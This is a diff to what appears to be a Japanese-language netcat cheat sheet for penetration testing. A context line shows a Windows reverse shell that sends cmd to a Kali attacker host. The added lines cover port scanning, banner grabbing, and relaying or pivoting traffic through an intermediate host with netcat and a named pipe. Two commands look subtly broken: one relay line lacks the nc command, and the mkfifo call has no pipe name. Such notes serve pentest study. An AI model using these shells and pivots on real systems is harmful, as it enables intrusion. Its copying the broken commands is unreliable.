@@ -11,3 +11,17 @@ cmd.exe /c C:\Windows\Temp\nc.exe <kali IP> <port> -e cmd #配送したncをcmd�
 
 //ポートスキャン
 nc -z <IP> 10-100 #１０番から１００番ポートを調べる例
+
+//バナー収集
+nc -vvv <IP> <port>
+
+//リレー
+nc -lvnp <port> | <target IP> <port> #これはピボット端末で
+nc <pivot IP> <port> #これを攻撃者端末でやるとnetcatの通信はターゲット端末まで中継される
+
+//名前付きパイプによる中継
+mkfifo #ピボット端末で
+nc -lvnp <port> < <pipe> | nc <target IP> <port> > <pipe> #ピボット端末で
+curl http://<pivot IP>:<port> #これを攻撃者でやるとピボット端末からターゲット端末にコマンドが中継される
+
+
